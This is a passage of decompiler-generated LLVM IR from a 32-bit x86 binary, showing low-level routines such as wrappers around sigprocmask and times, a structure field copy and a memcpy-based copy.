dec_label_pc_804cf07:                             ; preds = %dec_label_pc_804cef6.dec_label_pc_804cf07_crit_edge, %dec_label_pc_804cee4
  %v0_804cf17 = phi i32 [ %v0_804cf09.pre, %dec_label_pc_804cef6.dec_label_pc_804cf07_crit_edge ], [ %v0_804cee9, %dec_label_pc_804cee4 ]
  %v1_804cf07 = icmp eq i32 %arg1, 0
  %v1_804cf0e = icmp eq i1 %v1_804cf07, false
  br i1 %v1_804cf0e, label %dec_label_pc_804cf14, label %dec_label_pc_804cf10

dec_label_pc_804cf10:                             ; preds = %dec_label_pc_804cf07
  br label %dec_label_pc_804cf2c

dec_label_pc_804cf14:                             ; preds = %dec_label_pc_804cf07
  store i32 %v0_804cf17, i32* @ebx, align 4
  %v2_804cf19 = add i32 %v0_804cf17, %arg1
  %v1_804cf1d = call i32 @function_804d083(i32 %v2_804cf19)
  %v2_804cf25 = icmp slt i32 %v1_804cf1d, 0
  %v1_804cf27 = icmp eq i1 %v2_804cf25, false
  br i1 %v1_804cf27, label %dec_label_pc_804cf14.dec_label_pc_804cf2c_crit_edge, label %dec_label_pc_804cf29

dec_label_pc_804cf14.dec_label_pc_804cf2c_crit_edge: ; preds = %dec_label_pc_804cf14
  %v0_804cf2d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804cf2c

dec_label_pc_804cf29:                             ; preds = %dec_label_pc_804cf14, %dec_label_pc_804cef6
  br label %dec_label_pc_804cf2c

dec_label_pc_804cf2c:                             ; preds = %dec_label_pc_804cf14.dec_label_pc_804cf2c_crit_edge, %dec_label_pc_804cf10, %dec_label_pc_804cf29
  %v0_804cf2d = phi i32 [ %v0_804cf2d.pre, %dec_label_pc_804cf14.dec_label_pc_804cf2c_crit_edge ], [ %v0_804cf17, %dec_label_pc_804cf10 ], [ -1, %dec_label_pc_804cf29 ]
  store i32 %v0_804cee5, i32* @ebx, align 4
  ret i32 %v0_804cf2d

; uselistorder directives
  uselistorder i32 %v0_804cf17, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_804d083, { 1, 0 }
  uselistorder label %dec_label_pc_804cf2c, { 2, 0, 1 }
}

define i32 @function_804cf32(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804cf32:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804cf33 = load i32, i32* @esi, align 4
  %v4_804cf37 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804cf37, i32* @ecx, align 4
  %v2_804cf43 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804cf43, label %dec_label_pc_804cf5c, label %dec_label_pc_804cf47

dec_label_pc_804cf47:                             ; preds = %dec_label_pc_804cf32
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_804cf5c, label %dec_label_pc_804cf4c

dec_label_pc_804cf4c:                             ; preds = %dec_label_pc_804cf47
  %v1_804cf4c = call i32 @function_804b330(i32 %v0_804cf33)
  %v1_804cf51 = inttoptr i32 %v1_804cf4c to i32*
  store i32 22, i32* %v1_804cf51, align 4
  br label %dec_label_pc_804cf83

dec_label_pc_804cf5c:                             ; preds = %dec_label_pc_804cf47, %dec_label_pc_804cf32
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804cf61 = load i32, i32* @ebx, align 4
  %v7_804cf69 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804cf61, i32* @ebx, align 4
  store i32 %v7_804cf69, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_804cf69, -4095
  br i1 %tmp12, label %dec_label_pc_804cf83, label %dec_label_pc_804cf75

dec_label_pc_804cf75:                             ; preds = %dec_label_pc_804cf5c
  %v1_804cf75 = call i32 @function_804b330(i32 %v0_804cf61)
  %v0_804cf7a = load i32, i32* %esi.global-to-local, align 4
  %v1_804cf7a = sub i32 0, %v0_804cf7a
  %v2_804cf7c = inttoptr i32 %v1_804cf75 to i32*
  store i32 %v1_804cf7a, i32* %v2_804cf7c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804cf83

dec_label_pc_804cf83:                             ; preds = %dec_label_pc_804cf75, %dec_label_pc_804cf5c, %dec_label_pc_804cf4c
  %storemerge = phi i32 [ -1, %dec_label_pc_804cf4c ], [ %v7_804cf69, %dec_label_pc_804cf5c ], [ -1, %dec_label_pc_804cf75 ]
  %v2_804cf83 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804cf83, i32* @edx, align 4
  store i32 %v0_804cf33, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804cf69, { 1, 0, 2 }
  uselistorder i32 %v0_804cf61, { 1, 0 }
  uselistorder i32* @edx, { 126, 8, 10, 65, 66, 67, 68, 69, 9, 63, 82, 127, 128, 132, 131, 84, 85, 2, 86, 87, 88, 89, 90, 91, 92, 93, 3, 94, 95, 83, 70, 71, 72, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 4, 120, 121, 122, 123, 124, 129, 11, 73, 74, 75, 76, 130, 125, 32, 33, 77, 78, 5, 46, 34, 0, 44, 45, 35, 36, 42, 43, 37, 38, 40, 1, 41, 39, 6, 12, 20, 60, 15, 23, 13, 14, 24, 16, 17, 18, 19, 21, 22, 25, 47, 48, 49, 26, 27, 28, 29, 30, 31, 61, 62, 50, 51, 52, 53, 54, 59, 58, 55, 56, 57, 64, 79, 80, 7, 81, 133 }
  uselistorder i32 22, { 16, 14, 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32 3, { 0, 17, 8, 23, 1, 2, 4, 10, 11, 12, 13, 16, 9, 14, 15, 3, 18, 19, 20, 21, 6, 22, 7, 5 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_804cf87(%tms* %arg1) local_unnamed_addr {
dec_label_pc_804cf87:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804cf87 = load i32, i32* @edi, align 4
  store i32 %v0_804cf87, i32* %stack_var_-4, align 4
  %v4_804cf8b = ptrtoint %tms* %arg1 to i32
  store i32 %v4_804cf8b, i32* %edi.global-to-local, align 4
  %v0_804cf8f = load i32, i32* @ebx, align 4
  %v3_804cf97 = call i32 @times(%tms* %arg1)
  store i32 %v3_804cf97, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_804cf97, -4095
  br i1 %tmp9, label %dec_label_pc_804cfaf, label %dec_label_pc_804cfa3

dec_label_pc_804cfa3:                             ; preds = %dec_label_pc_804cf87
  %v1_804cfa3 = call i32 @function_804b330(i32 %v0_804cf8f)
  %v0_804cfa8 = load i32, i32* %edi.global-to-local, align 4
  %v1_804cfa8 = sub i32 0, %v0_804cfa8
  %v2_804cfaa = inttoptr i32 %v1_804cfa3 to i32*
  store i32 %v1_804cfa8, i32* %v2_804cfaa, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804cfb3.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804cfaf

dec_label_pc_804cfaf:                             ; preds = %dec_label_pc_804cf87, %dec_label_pc_804cfa3
  %v2_804cfb3 = phi i32 [ %v0_804cf87, %dec_label_pc_804cf87 ], [ %v2_804cfb3.pre, %dec_label_pc_804cfa3 ]
  %v0_804cfb0 = phi i32 [ %v3_804cf97, %dec_label_pc_804cf87 ], [ -1, %dec_label_pc_804cfa3 ]
  store i32 %v2_804cfb3, i32* %edi.global-to-local, align 4
  ret i32 %v0_804cfb0

; uselistorder directives
  uselistorder i32 %v3_804cf97, { 1, 0, 2 }
  uselistorder i32* @edi, { 87, 96, 97, 98, 99, 100, 162, 10, 167, 168, 175, 163, 3, 164, 165, 166, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 101, 102, 103, 149, 150, 151, 152, 153, 154, 155, 156, 4, 157, 158, 159, 160, 161, 173, 174, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 37, 38, 11, 88, 89, 117, 118, 119, 120, 121, 122, 12, 169, 170, 171, 172, 39, 9, 0, 56, 40, 41, 42, 43, 44, 54, 55, 45, 46, 47, 48, 49, 50, 51, 5, 1, 52, 53, 123, 6, 124, 125, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 29, 26, 27, 28, 30, 31, 32, 33, 34, 57, 35, 36, 90, 91, 92, 93, 94, 95, 58, 61, 59, 60, 2, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 7, 82, 83, 84, 85, 86, 126, 127, 8, 128, 129, 130, 131, 132, 133 }
  uselistorder %tms* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804cfaf, { 1, 0 }
}

define i32 @function_804cfb5(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804cfb5:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804cfb6 = load i32, i32* @ebx, align 4
  store i32 %v0_804cfb6, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v4_804cfbe = ptrtoint i16* %arg1 to i32
  store i32 %v4_804cfbe, i32* %esi.global-to-local, align 4
  %v3_804cfc7 = inttoptr i32 %arg2 to i8*
  %v4_804cfc7 = call i32 @function_804b381(i8* %v3_804cfc7, i32 0, i32 88)
  store i32 %v4_804cfc7, i32* %eax.global-to-local, align 4
  %v2_804cfcc = load i16, i16* %arg1, align 2
  %v3_804cfcc = zext i16 %v2_804cfcc to i32
  store i32 %v3_804cfcc, i32* %eax.global-to-local, align 4
  %v0_804cfcf = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cfcf = add i32 %v0_804cfcf, 4
  %v2_804cfcf = inttoptr i32 %v1_804cfcf to i32*
  store i32 0, i32* %v2_804cfcf, align 4
  %v0_804cfd6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cfd6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cfd6 = inttoptr i32 %v1_804cfd6 to i32*
  store i32 %v0_804cfd6, i32* %v2_804cfd6, align 4
  %v0_804cfd8 = load i32, i32* %esi.global-to-local, align 4
  %v1_804cfd8 = add i32 %v0_804cfd8, 4
  %v2_804cfd8 = inttoptr i32 %v1_804cfd8 to i32*
  %v3_804cfd8 = load i32, i32* %v2_804cfd8, align 4
  store i32 %v3_804cfd8, i32* %eax.global-to-local, align 4
  %v1_804cfdb = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cfdb = add i32 %v1_804cfdb, 12
  %v3_804cfdb = inttoptr i32 %v2_804cfdb to i32*
  store i32 %v3_804cfd8, i32* %v3_804cfdb, align 4
  %v0_804cfde = load i32, i32* %esi.global-to-local, align 4
  %v1_804cfde = add i32 %v0_804cfde, 8
  %v2_804cfde = inttoptr i32 %v1_804cfde to i16*
  %v3_804cfde = load i16, i16* %v2_804cfde, align 2
  %v4_804cfde = zext i16 %v3_804cfde to i32
  store i32 %v4_804cfde, i32* %eax.global-to-local, align 4
  %v1_804cfe2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cfe2 = add i32 %v1_804cfe2, 16
  %v3_804cfe2 = inttoptr i32 %v2_804cfe2 to i32*
  store i32 %v4_804cfde, i32* %v3_804cfe2, align 4
  %v0_804cfe5 = load i32, i32* %esi.global-to-local, align 4
  %v1_804cfe5 = add i32 %v0_804cfe5, 10
  %v2_804cfe5 = inttoptr i32 %v1_804cfe5 to i16*
  %v3_804cfe5 = load i16, i16* %v2_804cfe5, align 2
  %v4_804cfe5 = zext i16 %v3_804cfe5 to i32
  store i32 %v4_804cfe5, i32* %eax.global-to-local, align 4
  %v1_804cfe9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cfe9 = add i32 %v1_804cfe9, 20
  %v3_804cfe9 = inttoptr i32 %v2_804cfe9 to i32*
  store i32 %v4_804cfe5, i32* %v3_804cfe9, align 4
  %v0_804cfec = load i32, i32* %esi.global-to-local, align 4
  %v1_804cfec = add i32 %v0_804cfec, 12
  %v2_804cfec = inttoptr i32 %v1_804cfec to i16*
  %v3_804cfec = load i16, i16* %v2_804cfec, align 2
  %v4_804cfec = zext i16 %v3_804cfec to i32
  store i32 %v4_804cfec, i32* %eax.global-to-local, align 4
  %v1_804cff0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cff0 = add i32 %v1_804cff0, 24
  %v3_804cff0 = inttoptr i32 %v2_804cff0 to i32*
  store i32 %v4_804cfec, i32* %v3_804cff0, align 4
  %v0_804cff3 = load i32, i32* %esi.global-to-local, align 4
  %v1_804cff3 = add i32 %v0_804cff3, 14
  %v2_804cff3 = inttoptr i32 %v1_804cff3 to i16*
  %v3_804cff3 = load i16, i16* %v2_804cff3, align 2
  %v4_804cff3 = zext i16 %v3_804cff3 to i32
  store i32 %v4_804cff3, i32* %eax.global-to-local, align 4
  %v1_804cff7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cff7 = add i32 %v1_804cff7, 28
  %v3_804cff7 = inttoptr i32 %v2_804cff7 to i32*
  store i32 %v4_804cff3, i32* %v3_804cff7, align 4
  %v0_804cffa = load i32, i32* %esi.global-to-local, align 4
  %v1_804cffa = add i32 %v0_804cffa, 16
  %v2_804cffa = inttoptr i32 %v1_804cffa to i16*
  %v3_804cffa = load i16, i16* %v2_804cffa, align 2
  %v4_804cffa = zext i16 %v3_804cffa to i32
  store i32 %v4_804cffa, i32* %eax.global-to-local, align 4
  %v0_804cffe = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cffe = add i32 %v0_804cffe, 36
  %v2_804cffe = inttoptr i32 %v1_804cffe to i32*
  store i32 0, i32* %v2_804cffe, align 4
  %v0_804d005 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d005 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d005 = add i32 %v1_804d005, 32
  %v3_804d005 = inttoptr i32 %v2_804d005 to i32*
  store i32 %v0_804d005, i32* %v3_804d005, align 4
  %v0_804d008 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d008 = add i32 %v0_804d008, 20
  %v2_804d008 = inttoptr i32 %v1_804d008 to i32*
  %v3_804d008 = load i32, i32* %v2_804d008, align 4
  store i32 %v3_804d008, i32* %eax.global-to-local, align 4
  %v1_804d00b = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d00b = add i32 %v1_804d00b, 44
  %v3_804d00b = inttoptr i32 %v2_804d00b to i32*
  store i32 %v3_804d008, i32* %v3_804d00b, align 4
  %v0_804d00e = load i32, i32* %esi.global-to-local, align 4
  %v1_804d00e = add i32 %v0_804d00e, 24
  %v2_804d00e = inttoptr i32 %v1_804d00e to i32*
  %v3_804d00e = load i32, i32* %v2_804d00e, align 4
  store i32 %v3_804d00e, i32* %eax.global-to-local, align 4
  %v1_804d011 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d011 = add i32 %v1_804d011, 48
  %v3_804d011 = inttoptr i32 %v2_804d011 to i32*
  store i32 %v3_804d00e, i32* %v3_804d011, align 4
  %v0_804d014 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d014 = add i32 %v0_804d014, 28
  %v2_804d014 = inttoptr i32 %v1_804d014 to i32*
  %v3_804d014 = load i32, i32* %v2_804d014, align 4
  store i32 %v3_804d014, i32* %eax.global-to-local, align 4
  %v1_804d017 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d017 = add i32 %v1_804d017, 52
  %v3_804d017 = inttoptr i32 %v2_804d017 to i32*
  store i32 %v3_804d014, i32* %v3_804d017, align 4
  %v0_804d01a = load i32, i32* %esi.global-to-local, align 4
  %v1_804d01a = add i32 %v0_804d01a, 32
  %v2_804d01a = inttoptr i32 %v1_804d01a to i32*
  %v3_804d01a = load i32, i32* %v2_804d01a, align 4
  store i32 %v3_804d01a, i32* %eax.global-to-local, align 4
  %v1_804d01d = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d01d = add i32 %v1_804d01d, 56
  %v3_804d01d = inttoptr i32 %v2_804d01d to i32*
  store i32 %v3_804d01a, i32* %v3_804d01d, align 4
  %v0_804d020 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d020 = add i32 %v0_804d020, 40
  %v2_804d020 = inttoptr i32 %v1_804d020 to i32*
  %v3_804d020 = load i32, i32* %v2_804d020, align 4
  store i32 %v3_804d020, i32* %eax.global-to-local, align 4
  %v1_804d023 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d023 = add i32 %v1_804d023, 64
  %v3_804d023 = inttoptr i32 %v2_804d023 to i32*
  store i32 %v3_804d020, i32* %v3_804d023, align 4
  %v0_804d026 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d026 = add i32 %v0_804d026, 48
  %v2_804d026 = inttoptr i32 %v1_804d026 to i32*
  %v3_804d026 = load i32, i32* %v2_804d026, align 4
  store i32 %v3_804d026, i32* %eax.global-to-local, align 4
  %v1_804d029 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d029 = add i32 %v1_804d029, 72
  %v3_804d029 = inttoptr i32 %v2_804d029 to i32*
  store i32 %v3_804d026, i32* %v3_804d029, align 4
  %v2_804d02f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d02f, i32* @ebx, align 4
  ret i32 %v3_804d026

; uselistorder directives
  uselistorder i32 72, { 2, 0, 3, 1 }
  uselistorder i32 64, { 5, 2, 1, 0, 3, 4 }
  uselistorder i32 40, { 10, 9, 4, 0, 5, 1, 2, 6, 7, 8, 3 }
  uselistorder i32 56, { 5, 2, 1, 0, 3, 4 }
  uselistorder i32 52, { 3, 0, 4, 5, 2, 1 }
  uselistorder i32 48, { 9, 10, 7, 1, 6, 2, 3, 0, 4, 8, 5 }
  uselistorder i32 32, { 38, 39, 46, 25, 33, 44, 45, 40, 1, 0, 2, 3, 30, 4, 5, 6, 7, 8, 31, 19, 20, 22, 41, 9, 11, 10, 27, 21, 34, 35, 12, 13, 32, 26, 14, 15, 28, 16, 36, 18, 17, 29, 37, 42, 24, 23, 43 }
  uselistorder i32 36, { 5, 2, 0, 1, 3, 4 }
  uselistorder i32 14, { 7, 0, 3, 1, 8, 9, 6, 4, 5, 2 }
  uselistorder i32 24, { 8, 9, 6, 10, 11, 12, 13, 3, 2, 1, 7, 0, 4, 5 }
  uselistorder i32 20, { 8, 9, 5, 7, 10, 11, 12, 13, 14, 3, 2, 1, 0, 4, 6 }
  uselistorder i32 10, { 13, 14, 8, 17, 4, 0, 1, 2, 3, 7, 10, 9, 11, 5, 12, 15, 6, 16, 18, 19, 20, 21 }
  uselistorder i32 16, { 44, 45, 46, 47, 48, 49, 50, 51, 13, 28, 62, 52, 2, 7, 60, 5, 4, 61, 0, 6, 53, 54, 3, 14, 26, 30, 27, 29, 21, 20, 19, 11, 10, 9, 18, 31, 32, 33, 8, 43, 40, 42, 41, 34, 35, 36, 22, 12, 37, 38, 39, 15, 16, 55, 56, 57, 1, 58, 59, 17, 23, 24, 25 }
  uselistorder i32 8, { 51, 114, 52, 53, 54, 55, 56, 57, 58, 59, 22, 115, 23, 116, 24, 38, 66, 67, 68, 69, 70, 71, 72, 0, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 1, 60, 83, 84, 85, 86, 87, 26, 2, 27, 3, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 25, 105, 106, 4, 107, 108, 109, 110, 5, 111, 61, 62, 63, 64, 40, 29, 41, 14, 42, 13, 30, 10, 31, 12, 28, 11, 39, 43, 50, 44, 45, 46, 47, 48, 15, 49, 32, 16, 17, 18, 19, 36, 20, 33, 34, 21, 35, 37, 65, 112, 7, 113, 6, 117, 9, 118, 8 }
  uselistorder i32 (i8*, i32, i32)* @function_804b381, { 0, 6, 5, 1, 2, 3, 4 }
}

define i32 @function_804d032(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d032:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d033 = load i32, i32* @esi, align 4
  store i32 %v0_804d033, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804d034 = sdiv i32 %sext, 16777216
  store i32 %v4_804d034, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804d03c = ptrtoint i16* %arg1 to i32
  store i32 %v4_804d03c, i32* %edi.global-to-local, align 4
  %v2_804d042 = udiv i32 %v4_804d034, 4
  %v3_804d045 = inttoptr i32 %arg2 to i8*
  %v4_804d045 = bitcast i16* %arg1 to i8*
  %v5_804d045 = call i8* @_memcpy(i8* %v4_804d045, i8* %v3_804d045, i32 %v2_804d042)
  %v6_804d045 = ptrtoint i8* %v5_804d045 to i32
  store i32 %v6_804d045, i32* @ecx, align 4
  %v0_804d047 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d047 = and i32 %v0_804d047, 2
  %v3_804d047 = icmp eq i32 %v2_804d047, 0
  br i1 %v3_804d047, label %dec_label_pc_804d04d, label %dec_label_pc_804d04b

dec_label_pc_804d04b:                             ; preds = %dec_label_pc_804d032
  %v0_804d04b = load i32, i32* %esi.global-to-local, align 4
  %v1_804d04b = inttoptr i32 %v0_804d04b to i16*
  %v2_804d04b = load i16, i16* %v1_804d04b, align 2
  %v3_804d04b = load i32, i32* %edi.global-to-local, align 4
  %v4_804d04b = inttoptr i32 %v3_804d04b to i16*
  store i16 %v2_804d04b, i16* %v4_804d04b, align 2
  %v5_804d04b = load i32, i32* %edi.global-to-local, align 4
  %v6_804d04b = load i32, i32* %esi.global-to-local, align 4
  %v7_804d04b = load i1, i1* @df, align 1
  %v8_804d04b = select i1 %v7_804d04b, i32 -2, i32 2
  %v9_804d04b = add i32 %v8_804d04b, %v5_804d04b
  %v10_804d04b = add i32 %v8_804d04b, %v6_804d04b
  store i32 %v9_804d04b, i32* %edi.global-to-local, align 4
  store i32 %v10_804d04b, i32* %esi.global-to-local, align 4
  %v0_804d04d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d04d

dec_label_pc_804d04d:                             ; preds = %dec_label_pc_804d032, %dec_label_pc_804d04b
  %v0_804d04d = phi i32 [ %v0_804d047, %dec_label_pc_804d032 ], [ %v0_804d04d.pre, %dec_label_pc_804d04b ]
  %v2_804d04d = urem i32 %v0_804d04d, 2
  %v3_804d04d = icmp eq i32 %v2_804d04d, 0
  br i1 %v3_804d04d, label %dec_label_pc_804d052, label %dec_label_pc_804d051

dec_label_pc_804d051:                             ; preds = %dec_label_pc_804d04d
  %v0_804d051 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d051 = inttoptr i32 %v0_804d051 to i8*
  %v2_804d051 = load i8, i8* %v1_804d051, align 1
  %v3_804d051 = load i32, i32* %edi.global-to-local, align 4
  %v4_804d051 = inttoptr i32 %v3_804d051 to i8*
  store i8 %v2_804d051, i8* %v4_804d051, align 1
  %v5_804d051 = load i32, i32* %edi.global-to-local, align 4
  %v6_804d051 = load i32, i32* %esi.global-to-local, align 4
  %v7_804d051 = load i1, i1* @df, align 1
  %v8_804d051 = select i1 %v7_804d051, i32 -1, i32 1
  %v9_804d051 = add i32 %v8_804d051, %v5_804d051
  %v10_804d051 = add i32 %v8_804d051, %v6_804d051
  store i32 %v9_804d051, i32* %edi.global-to-local, align 4
  store i32 %v10_804d051, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804d052

dec_label_pc_804d052:                             ; preds = %dec_label_pc_804d04d, %dec_label_pc_804d051
  store i32 %v4_804d03c, i32* %eax.global-to-local, align 4
  %v2_804d056 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d056, i32* @esi, align 4
  ret i32 %v4_804d03c

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 -2, { 2, 0, 1 }
  uselistorder i1* @df, { 6, 7, 4, 0, 1, 2, 3, 5 }
  uselistorder i32 2, { 1, 61, 15, 62, 16, 38, 0, 23, 35, 24, 36, 25, 37, 2, 17, 3, 4, 18, 59, 5, 6, 21, 7, 26, 19, 22, 46, 11, 8, 20, 27, 30, 28, 29, 9, 13, 12, 44, 40, 41, 42, 43, 45, 56, 39, 47, 48, 49, 50, 51, 52, 53, 54, 55, 31, 33, 14, 32, 57, 58, 10, 34, 60, 63 }
  uselistorder i32* @ecx, { 13, 111, 51, 52, 12, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 6, 83, 53, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 7, 99, 100, 102, 103, 104, 105, 101, 112, 14, 15, 16, 37, 113, 54, 55, 8, 30, 19, 0, 27, 28, 3, 9, 29, 20, 21, 22, 26, 25, 23, 24, 56, 1, 2, 57, 58, 60, 10, 4, 31, 11, 5, 17, 18, 47, 48, 46, 32, 33, 34, 35, 36, 38, 39, 40, 41, 42, 43, 44, 45, 49, 50, 59, 106, 107, 108, 109, 110, 114, 115, 116, 117, 118 }
  uselistorder i32 4, { 1, 80, 81, 82, 83, 84, 85, 152, 153, 158, 159, 163, 164, 165, 154, 21, 36, 155, 157, 160, 162, 107, 108, 109, 110, 111, 112, 2, 113, 114, 115, 116, 117, 118, 119, 120, 105, 106, 86, 3, 121, 23, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 5, 142, 143, 24, 144, 4, 161, 156, 39, 26, 87, 88, 89, 90, 91, 0, 40, 41, 28, 42, 43, 44, 45, 46, 47, 48, 49, 10, 50, 51, 52, 53, 54, 55, 56, 8, 57, 58, 59, 29, 9, 60, 61, 62, 63, 7, 64, 65, 66, 27, 79, 6, 37, 67, 68, 69, 70, 71, 72, 73, 74, 11, 30, 75, 76, 77, 78, 12, 13, 14, 15, 25, 22, 92, 16, 31, 32, 93, 94, 95, 96, 97, 17, 98, 99, 100, 33, 101, 102, 103, 18, 19, 20, 34, 35, 104, 145, 146, 147, 148, 149, 150, 151, 166, 167, 168, 169, 170, 171, 38 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 5, 4, 6, 7, 9, 8 }
  uselistorder i32* @esi, { 163, 164, 165, 166, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 2, 96, 97, 167, 168, 8, 169, 170, 171, 182, 183, 184, 185, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 135, 140, 3, 141, 142, 143, 144, 145, 146, 147, 136, 137, 138, 139, 148, 149, 150, 151, 152, 153, 154, 0, 155, 156, 157, 4, 158, 7, 159, 160, 161, 162, 94, 95, 98, 99, 5, 100, 101, 102, 103, 104, 105, 106, 107, 64, 65, 31, 37, 38, 39, 40, 32, 33, 34, 35, 36, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 27, 25, 26, 30, 28, 6, 29, 42, 41, 43, 1, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 76, 77, 78, 79, 80, 81, 82, 55, 56, 57, 58, 59, 60, 61, 62, 63, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 83, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 186 }
  uselistorder label %dec_label_pc_804d052, { 1, 0 }
  uselistorder label %dec_label_pc_804d04d, { 1, 0 }
}

define i32 @function_804d059(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d059:
  %v0_804d05c = call i32 @function_804aeed()
  %v2_804d068 = call i32 @function_804af6b(i32 %v0_804d05c, i32 %arg1)
  ret i32 %v2_804d068

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_804af6b, { 0, 5, 4, 3, 2, 1 }
}

define i32 @function_804d071() local_unnamed_addr {
dec_label_pc_804d071:
  %v0_804d071 = load i32, i32* @eax, align 4
  %v1_804d071 = add i32 %v0_804d071, 28
  %v2_804d071 = inttoptr i32 %v1_804d071 to i32*
  %v3_804d071 = load i32, i32* %v2_804d071, align 4
  store i32 %v3_804d071, i32* @global_var_804fad8.118, align 8
  %v1_804d07a = add i32 %v0_804d071, 44
  %v2_804d07a = inttoptr i32 %v1_804d07a to i32*
  %v3_804d07a = load i32, i32* %v2_804d07a, align 4
  store i32 %v3_804d07a, i32* @global_var_804fadc.119, align 4
  ret i32 %v3_804d07a

; uselistorder directives
  uselistorder i32 44, { 20, 13, 10, 17, 19, 18, 14, 15, 16, 4, 9, 5, 6, 7, 8, 11, 0, 1, 2, 3, 12 }
  uselistorder i32 28, { 19, 15, 16, 11, 17, 14, 3, 2, 1, 0, 9, 10, 12, 4, 5, 13, 7, 18, 6, 8 }
}

define i32 @function_804d083(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d083:
  %ecx.global-to-local = alloca i32, align 4
